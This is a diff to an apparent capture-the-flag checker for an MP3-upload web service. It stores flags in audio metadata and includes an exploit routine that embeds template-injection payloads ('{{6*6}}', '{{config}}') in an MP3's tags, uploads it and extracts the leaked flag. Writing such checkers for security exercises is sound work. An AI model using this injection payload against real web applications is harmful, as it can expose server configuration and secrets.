@@ -31,7 +31,7 @@ username = "admin"
 
 
 def setup_logger(log_file):
-    logger = logging.getLogger("my_logger")
+    logger = logging.getLogger("technoradio_logger")
     logger.setLevel(logging.DEBUG)
 
     # Create a file handler
@@ -75,25 +75,18 @@ async def putflag_test(
     # Try to upload mp3 to page
     with open("admin.mp3", "rb") as file:
         audio = eyed3.load("admin.mp3")
-        audio.tag.comments.set("FLAG" + task.flag + "FLAGEND")
+        audio.tag.comments.set("FLAG" + utils.encode_to_base64(task.flag) + "FLAGEND")
         audio.tag.save()
-        files = {"file": file}
-        headers = {"Content-Type": "audio/mpeg"}
+        files = {"mp3-file": file}
         logger.info("Tries to upload to home")
 
-        cookie = response.cookies.get("session")
-        logger.info("Received " + response.headers)
-        if cookie is None:
-            logger.warning("No session cookie!!!")
-            raise MumbleException("Session cookie missing")
-
-        response = await client.post("/home", files=files, headers=headers)
+        response = await client.post("/home", files=files)
 
         if response.status_code == 200:
-            print("File upload successful!")
-            logger.info("UPLOADED FLAG Successfully")
+            logger.info("UPLOADED FLAG Successfully: " + task.flag)
         else:
             logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
+            logger.info("HTML: " + response.text)
             raise MumbleException("Upload failed")
 
 
@@ -102,13 +95,19 @@ async def getflag_test(
     task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
 ) -> None:
     # login and check that file exists
-    url = await utils.login(client, username, password, logger)
+    logger.info("START get flag, try to loggin")
+    await utils.login(client, username, password, logger)
+    logger.info("Try getting admin mp3 file")
     response = await client.get("/UPLOAD_FOLDER/admin.mp3")
     # Find flag in response text
     assert_equals(response.status_code, 200, "Didn't find file")
+    logger.info("SUCCESSFULLY REACHED MP3 file")
     decoded_mp3 = base64.b64decode(response.text)
+
     if task.flag not in decoded_mp3:
+        logger.warning("NO FLAG in FILE")
         raise MumbleException("Flag receiving failed. Not sent by server")
+    logger.info("SUCCESSFULLY OBTAINED FLAG:" + task.flag)
 
 
 @checker.exploit(0)
@@ -116,25 +115,33 @@ async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[
     # Creates a malicious mp3 file named "exploit.mp3"
     mp3_helper.create_mp3("exploit.mp3")
     mp3_helper.create_modify_mp3("exploit.mp3", "{{6*6}}", "{{config}}", "Techno")
-    # TODO add logger
     # register
-    url = await utils.register_user_and_login(client, "eve", "IamAliceISwear", logger)
+    await utils.register_user_and_login(client, "eve", "IamAliceISwear", logger)
     file_path = "./exploit.mp3"
     # Try to upload mp3 to page
     with open(file_path, "rb") as file:
-        files = {"file": file}
-        headers = {"Content-Type": "audio/mpeg"}
+        files = {"mp3-file": file}
 
-        response = await client.post(url, files=files, headers=headers)
+        response = await client.post("/home", files=files)
 
         if response.status_code == 200:
-            print("File upload successful!")
+            logger.info("Attack Upload success")
         else:
+            logger.warning("Attack upload failed")
+            logger.info("HTML: " + response.text)
             raise MumbleException("Upload failed")
 
     # Find flag in response text
-    if flag := searcher.search_flag(response.text):
+    base_64_flag = utils.find_string_between_flags(response.text)
+    if base_64_flag is None:
+        logger.warning("NO FLAG in FILE, Flag b64 text was empty")
+        raise MumbleException("NO Flag found")
+    flag_text = utils.decode_from_base64(base_64_flag)
+
+    if flag := searcher.search_flag(flag_text.strip()):
+        logger.info("SUCCESSFULLY OBTAINED FLAG BY ATTACK: " + flag_text)
         return flag
+    logger.warning("NO FLAG in FILE, decoding failed: " + flag_text)
 
 
 @checker.putflag(1)
